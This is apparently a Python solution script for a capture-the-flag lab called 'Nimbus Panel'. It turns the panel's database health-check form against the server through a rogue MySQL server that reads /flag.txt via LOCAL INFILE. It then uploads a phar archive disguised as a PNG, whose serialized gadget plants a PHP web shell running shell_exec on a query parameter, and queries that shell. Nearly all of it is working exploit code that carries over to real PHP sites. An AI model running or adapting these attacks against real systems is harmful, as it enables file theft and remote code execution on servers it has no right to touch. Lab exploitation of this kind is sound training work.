#!/usr/bin/env python3
"""
Lab 19 - Nimbus Panel / rogue MySQL server.

Stage 1  read /flag.txt out of the web server with a LOCAL INFILE request.
Stage 2  aim the same primitive at a phar:// path so the phar wrapper
         deserialises attacker-controlled metadata (LoRexxar & Dawu chain).

Both stages run against the panel over plain HTTP; the rogue MySQL server is
rogue.py, imported from this directory and started in a background thread.

Python 3 standard library only.
"""

import base64
import hashlib
import io
import os
import re
import socket
import struct
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import rogue

LISTEN_PORT = 3306
UPLOAD_DIR = "/var/www/html/uploads"


# --------------------------------------------------------------------------
# HTTP helpers
# --------------------------------------------------------------------------
def post_form(base, fields, timeout=30):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(
        base, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def post_file(base, field, filename, blob, extra, timeout=30):
    """multipart/form-data by hand - no requests, no email package games."""
    boundary = "----phpctf" + os.urandom(8).hex()
    body = io.BytesIO()
    for k, v in extra.items():
        body.write(f"--{boundary}\r\n".encode())
        body.write(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        body.write(f"{v}\r\n".encode())
    body.write(f"--{boundary}\r\n".encode())
    body.write(
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode()
    )
    body.write(b"Content-Type: image/png\r\n\r\n")
    body.write(blob)
    body.write(f"\r\n--{boundary}--\r\n".encode())
    req = urllib.request.Request(
        base,
        data=body.getvalue(),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def http_get(url, timeout=20):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}"
    except urllib.error.URLError as e:
        return f"ERR {e}"


# --------------------------------------------------------------------------
# phar builder (stage 2)
# --------------------------------------------------------------------------
def build_phar(metadata: bytes, stub_prefix: bytes = b"") -> bytes:
    """
    Assemble a minimal phar archive by hand.

        <stub>                      must contain __HALT_COMPILER();
        <manifest length : u32>
        <file count : u32>
        <api version : u16>
        <global flags : u32>        bit 0x00010000 = a signature is present
        <alias length : u32><alias>
        <metadata length : u32><metadata>    <- unserialize() target
        <per-file entries>
        <file data>
        <signature><signature type : u32>"GBMB"

    phar.require_hash defaults to On, so the SHA-1 trailer is mandatory.
    """
    import zlib

    stub = stub_prefix + b"<?php __HALT_COMPILER(); ?>\r\n"

    name = b"a.txt"
    content = b"x"
    entry = struct.pack("<I", len(name)) + name
    entry += struct.pack("<I", len(content))                  # uncompressed size
    entry += struct.pack("<I", int(time.time()))              # timestamp
    entry += struct.pack("<I", len(content))                  # compressed size
    entry += struct.pack("<I", zlib.crc32(content) & 0xFFFFFFFF)  # CRC-32
    entry += struct.pack("<I", 0x000001B6)                    # flags (mode 0666)
    entry += struct.pack("<I", 0)                             # per-file metadata len

    # NOTE: every multi-byte field in a phar manifest is little-endian EXCEPT
    # the 2-byte API version, which phar.c reads big-endian by hand
    # (buffer[0]<<8 | buffer[1]).  0x1110 == API 1.1.0, the value phar writes.
    alias = b""
    manifest = struct.pack("<I", 1)                           # number of files
    manifest += b"\x11\x10"                                   # API version (BE)
    manifest += struct.pack("<I", 0x00010000)                 # global flags: signed
    manifest += struct.pack("<I", len(alias)) + alias
    manifest += struct.pack("<I", len(metadata)) + metadata   # <- unserialize target
    manifest += entry

    body = stub + struct.pack("<I", len(manifest)) + manifest + content
    # phar.require_hash is On by default, so the SHA-1 trailer is mandatory.
    # It is computed over everything up to (but not including) the digest.
    digest = hashlib.sha1(body).digest()
    return body + digest + struct.pack("<I", 0x0002) + b"GBMB"


def php_serialize_logger(logfile: str, buffer: str) -> bytes:
    """serialize() of a DebugLogger with the two properties we care about."""
    def s(v):
        b = v.encode()
        return b's:%d:"%s";' % (len(b), b)

    return (
        b'O:11:"DebugLogger":2:{'
        + s("logfile") + s(logfile)
        + s("buffer") + s(buffer)
        + b"}"
    )


# --------------------------------------------------------------------------
def my_ip():
    """The address the challenge container can reach us on."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return socket.gethostbyname(socket.gethostname())


def health_check(base, host, port):
    return post_form(
        base,
        {
            "action": "dbtest",
            "host": host,
            "port": str(port),
            "user": "healthcheck",
            "pass": "hunter2",
            "dbname": "nimbus",
        },
    )


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/") + "/"
    ip = my_ip()
    print(f"[*] target        : {base}")
    print(f"[*] rogue server  : {ip}:{LISTEN_PORT}")

    # ---------------------------------------------------------------- stage 1
    state = rogue.RogueState(["/flag.txt"])
    srv = rogue.serve("0.0.0.0", LISTEN_PORT, state)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    print("\n[1] asking the panel to 'health check' our rogue server")
    body = health_check(base, ip, LISTEN_PORT)
    for line in re.findall(r"\[(?:ok|!!)\][^<]*", body):
        print("    panel says:", line.strip())

    flag = None
    for path, data in state.captured:
        text = data.decode("utf-8", "replace").strip()
        print(f"    captured {len(data)} bytes of {path}: {text!r}")
        m = re.search(r"PHRACK\{[^}]*\}", text)
        if m:
            flag = m.group(0)

    # ---------------------------------------------------------------- stage 2
    print("\n[2] chaining the same primitive into phar:// deserialisation")
    shell = "<?php echo shell_exec($_GET['c'] ?? 'id'); ?>"
    gadget = php_serialize_logger(f"{UPLOAD_DIR}/pwn.php", shell)
    phar = build_phar(gadget, stub_prefix=b"\x89PNG\r\n\x1a\n")
    try:
        out = post_file(base, "avatar", "avatar.png", phar, {"action": "avatar"})
        m = re.search(r"uploads/([0-9a-f]{40}\.png)", out)
        if not m:
            print("    upload rejected; skipping stage 2")
        else:
            stored = f"{UPLOAD_DIR}/{m.group(1)}"
            print(f"    phar uploaded as {stored}")
            state2 = rogue.RogueState([f"phar://{stored}/a.txt"])
            srv.shutdown()
            srv.server_close()
            srv2 = rogue.serve("0.0.0.0", LISTEN_PORT, state2)
            threading.Thread(target=srv2.serve_forever, daemon=True).start()
            health_check(base, ip, LISTEN_PORT)
            time.sleep(1)
            probe = http_get(base + "uploads/pwn.php?c=id;cat%20/flag.txt")
            print("    webshell says:", " ".join(probe.split()) or "(nothing)")
            srv2.shutdown()
            srv2.server_close()
    except (urllib.error.URLError, OSError) as exc:
        print(f"    stage 2 failed: {exc}")

    if not flag:
        print("\n[-] no flag captured")
        return 1
    print(f"\nFLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
